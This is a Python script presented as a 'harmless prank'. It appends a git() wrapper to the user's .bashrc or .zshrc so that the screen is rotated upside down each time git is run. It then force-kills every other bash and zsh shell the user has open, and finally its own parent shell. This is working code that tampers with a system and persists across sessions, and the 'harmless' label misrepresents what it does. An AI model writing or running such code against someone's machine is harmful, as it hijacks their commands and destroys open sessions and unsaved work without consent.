#!/usr/bin/env python3
import os
import subprocess

# Detect shell
shell = os.environ.get('SHELL', '')
if 'zsh' in shell:
    rc_file = os.path.expanduser('~/.zshrc')
elif 'bash' in shell:
    rc_file = os.path.expanduser('~/.bashrc')
else:
    print("Unsupported shell. Exiting.")
    exit(1)

# Prank function: flips screen when 'code' is run
prank_code = """
git() {
  output=$(xrandr | awk '/ connected/{print $1; exit}')
  xrandr --output "$output" --rotate inverted
  command git "$@"
}
"""

# Append prank to rc file if not already present
with open(rc_file, 'r') as f:
    content = f.read()

if prank_code not in content:
    with open(rc_file, 'a') as f:
        f.write("\n# Added by harmless prank script\n")
        f.write(prank_code)

print(f"Prank added to {rc_file}!")

# Kill all other interactive shells (except this one)
current_shell_pid = int(open(f"/proc/{os.getpid()}/status").read().split("PPid:\t")[1].splitlines()[0])
# List all bash/zsh processes for current user
ps_output = subprocess.check_output(
    ["ps", "-u", os.getlogin(), "-o", "pid,comm"],
    text=True
)
print(ps_output)
for line in ps_output.strip().split('\n')[1:]:  # skip header
    pid_str, cmd = line.strip().split(maxsplit=1)
    pid = int(pid_str)
    if pid != current_shell_pid and cmd in ('bash', 'zsh'):
        try:
            os.kill(pid, 9)
        except ProcessLookupError:
            pass
#run xrandr -o normal to reset the screen orientation
subprocess.run(['xrandr', '-o', 'normal'])

os.kill(current_shell_pid, 9)
